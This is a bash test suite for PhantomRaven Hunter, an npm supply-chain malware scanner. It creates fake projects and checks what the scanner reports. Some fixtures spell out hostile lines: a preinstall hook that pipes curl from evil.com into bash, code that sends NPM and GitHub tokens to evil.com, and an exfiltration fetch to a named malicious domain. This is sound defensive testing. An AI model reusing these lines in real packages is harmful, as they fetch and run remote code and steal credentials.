#!/bin/bash

###############################################################################
# PhantomRaven Hunter Test Suite
#
# ⚠️  SAFETY GUARANTEE ⚠️
# This test script is SAFE and does NOT:
# - Install any npm packages
# - Run npm install
# - Download any external content
# - Connect to any network
# - Execute any malicious code
#
# It ONLY:
# - Creates fake package.json files
# - Runs the scanner against them
# - Deletes test files after completion
#
# All "malicious" content exists only as TEXT in fake files.
# NO actual malware is present or executed.
#
###############################################################################

# Use errexit but handle errors properly in run_test
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SCANNER="$SCRIPT_DIR/../phantomraven-hunter.sh"
TEST_DIR="$SCRIPT_DIR/test_projects"
RESULTS_FILE="/tmp/phantomraven_test_results.txt"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Counters
TESTS_PASSED=0
TESTS_FAILED=0
TESTS_TOTAL=0

# Setup
setup() {
    echo "Setting up test environment..."
    rm -rf "$TEST_DIR"
    mkdir -p "$TEST_DIR"
    > "$RESULTS_FILE"
}

# Teardown
teardown() {
    echo "Cleaning up test environment..."
    rm -rf "$TEST_DIR"
}

# Test helper
run_test() {
    local test_name="$1"
    local expected_exit_code="$2"
    local project_path="$3"
    local should_contain="$4"
    
    ((TESTS_TOTAL++)) || true
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST $TESTS_TOTAL: $test_name"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Run scanner - temporarily disable errexit for this section
    set +e
    "$SCANNER" "$project_path" > "$RESULTS_FILE" 2>&1
    local actual_exit_code=$?
    set -e
    
    # Check exit code
    local test_passed=true
    if [ "$actual_exit_code" -eq "$expected_exit_code" ]; then
        echo -e "${GREEN}✓${NC} Exit code: $actual_exit_code (expected: $expected_exit_code)"
    else
        echo -e "${RED}✗${NC} Exit code: $actual_exit_code (expected: $expected_exit_code)"
        test_passed=false
    fi
    
    # Check output contains expected string
    if [ -n "$should_contain" ]; then
        if grep -q "$should_contain" "$RESULTS_FILE"; then
            echo -e "${GREEN}✓${NC} Output contains: $should_contain"
        else
            echo -e "${RED}✗${NC} Output does NOT contain: $should_contain"
            test_passed=false
        fi
    fi
    
    # Update counters
    if [ "$test_passed" = true ]; then
        ((TESTS_PASSED++)) || true
        echo -e "${GREEN}✓ TEST PASSED${NC}"
    else
        ((TESTS_FAILED++)) || true
        echo "Output:"
        cat "$RESULTS_FILE"
    fi
}

###############################################################################
# TEST CASE 1: Clean Project (No Malware)
###############################################################################
test_clean_project() {
    local project="$TEST_DIR/clean_project"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "clean-project",
  "version": "1.0.0",
  "dependencies": {
    "express": "^4.18.0",
    "lodash": "^4.17.21"
  }
}
EOF
    
    run_test \
        "Clean Project" \
        0 \
        "$project" \
        "No critical threats detected"
}

###############################################################################
# TEST CASE 2: Malicious RDD (Known Domain)
###############################################################################
test_malicious_rdd() {
    local project="$TEST_DIR/malicious_rdd"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "infected-project",
  "version": "1.0.0",
  "dependencies": {
    "unused-imports": "http://packages.storeartifact.com/npm/unused-imports"
  }
}
EOF
    
    run_test \
        "Malicious RDD (Known Domain)" \
        1 \
        "$project" \
        "CRITICAL"
}

###############################################################################
# TEST CASE 3: Known Malicious Package
###############################################################################
test_known_malicious_package() {
    local project="$TEST_DIR/malicious_package"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "infected-project",
  "version": "1.0.0",
  "dependencies": {
    "eslint-comments": "^1.0.0"
  }
}
EOF
    
    run_test \
        "Known Malicious Package" \
        1 \
        "$project" \
        "MALICIOUS PACKAGE"
}

###############################################################################
# TEST CASE 4: Legitimate GitHub URL (Should NOT be Critical)
###############################################################################
test_legitimate_github_url() {
    local project="$TEST_DIR/github_dep"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "test-project",
  "version": "1.0.0",
  "dependencies": {
    "test262": "https://github.com/tc39/test262#47ab262658cd97ae35c9a537808cac18fa4ab567"
  }
}
EOF
    
    run_test \
        "Legitimate GitHub URL" \
        0 \
        "$project" \
        "No critical threats detected"
}

###############################################################################
# TEST CASE 5: Suspicious RDD (Unknown Domain)
###############################################################################
test_suspicious_unknown_rdd() {
    local project="$TEST_DIR/suspicious_rdd"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "suspicious-project",
  "version": "1.0.0",
  "dependencies": {
    "some-package": "http://sketchy-domain.com/package.tgz"
  }
}
EOF
    
    run_test \
        "Suspicious RDD (Unknown Domain)" \
        2 \
        "$project" \
        "WARNING"
}

###############################################################################
# TEST CASE 6: Suspicious Lifecycle Script
###############################################################################
test_suspicious_script() {
    local project="$TEST_DIR/suspicious_script"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "suspicious-project",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://evil.com/malware.sh | bash"
  }
}
EOF
    
    run_test \
        "Suspicious Lifecycle Script" \
        2 \
        "$project" \
        "Suspicious Lifecycle Scripts"
}

###############################################################################
# TEST CASE 7: Legitimate esbuild Install Script (Should Whitelist)
###############################################################################
test_legitimate_install_script() {
    local project="$TEST_DIR/esbuild_project"
    mkdir -p "$project/node_modules/esbuild"
    
    cat > "$project/node_modules/esbuild/package.json" << 'EOF'
{
  "name": "esbuild",
  "version": "0.19.0",
  "scripts": {
    "postinstall": "node install.js"
  }
}
EOF
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "normal-project",
  "version": "1.0.0",
  "dependencies": {
    "esbuild": "^0.19.0"
  }
}
EOF
    
    run_test \
        "Legitimate esbuild Install Script" \
        0 \
        "$project" \
        "No critical threats detected"
}

###############################################################################
# TEST CASE 8: Multiple Malicious Packages
###############################################################################
test_multiple_malicious() {
    local project="$TEST_DIR/multiple_malicious"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "very-infected-project",
  "version": "1.0.0",
  "dependencies": {
    "unused-imports": "http://packages.storeartifact.com/npm/unused-imports",
    "eslint-comments": "^1.0.0",
    "transform-react-remove-prop-types": "^1.0.0"
  }
}
EOF
    
    run_test \
        "Multiple Malicious Indicators" \
        1 \
        "$project" \
        "CRITICAL"
}

###############################################################################
# TEST CASE 9: Deep Scan - Credential Theft Pattern
###############################################################################
test_credential_theft_pattern() {
    local project="$TEST_DIR/credential_theft"
    mkdir -p "$project/node_modules/bad-package"
    
    cat > "$project/node_modules/bad-package/package.json" << 'EOF'
{
  "name": "bad-package",
  "version": "1.0.0"
}
EOF
    
    cat > "$project/node_modules/bad-package/index.js" << 'EOF'
const token = process.env.NPM_TOKEN;
const githubToken = process.env.GITHUB_TOKEN;
fetch('http://evil.com/steal', { 
    method: 'POST', 
    body: JSON.stringify({ token, githubToken })
});
EOF
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "test-project",
  "version": "1.0.0",
  "dependencies": {
    "bad-package": "^1.0.0"
  }
}
EOF
    
    # Note: This test requires --deep flag
    # We'll just verify the script can handle it
    echo "⏩ Skipping deep scan test (would require --deep flag implementation in test)"
}

###############################################################################
# TEST CASE 10: Hardcoded Malicious Domain in JavaScript Code
###############################################################################
test_hardcoded_malicious_domain() {
    local project="$TEST_DIR/hardcoded_domain"
    mkdir -p "$project"
    
    cat > "$project/package.json" << 'EOF'
{
  "name": "test-project",
  "version": "1.0.0"
}
EOF
    
    cat > "$project/index.js" << 'EOF'
const api = 'http://packages.storeartifact.com';
fetch(api + '/exfiltrate', { method: 'POST' });
EOF
    
    run_test \
        "Hardcoded Malicious Domain in Code" \
        1 \
        "$project" \
        "MALICIOUS DOMAIN FOUND"
}

###############################################################################
# Run All Tests
###############################################################################
main() {
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║                                                           ║"
    echo "║       PhantomRaven Hunter Test Suite                      ║"
    echo "║                                                           ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo ""
    
    # Check if scanner exists
    if [ ! -f "$SCANNER" ]; then
        echo -e "${RED}ERROR: Scanner not found at $SCANNER${NC}"
        exit 1
    fi
    
    # Check if jq is installed
    if ! command -v jq &> /dev/null; then
        echo -e "${RED}ERROR: jq is required but not installed${NC}"
        exit 1
    fi
    
    setup
    
    # Run tests
    test_clean_project
    test_malicious_rdd
    test_known_malicious_package
    test_legitimate_github_url
    test_suspicious_unknown_rdd
    test_suspicious_script
    test_legitimate_install_script
    test_multiple_malicious
    test_credential_theft_pattern
    test_hardcoded_malicious_domain
    
    teardown
    
    # Summary
    echo ""
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║                   TEST SUMMARY                            ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo ""
    echo "Total Tests:  $TESTS_TOTAL"
    echo -e "Passed:       ${GREEN}$TESTS_PASSED${NC}"
    echo -e "Failed:       ${RED}$TESTS_FAILED${NC}"
    echo ""
    
    if [ "$TESTS_FAILED" -eq 0 ]; then
        echo -e "${GREEN}✓ ALL TESTS PASSED${NC}"
        exit 0
    else
        echo -e "${RED}✗ SOME TESTS FAILED${NC}"
        exit 1
    fi
}

main "$@"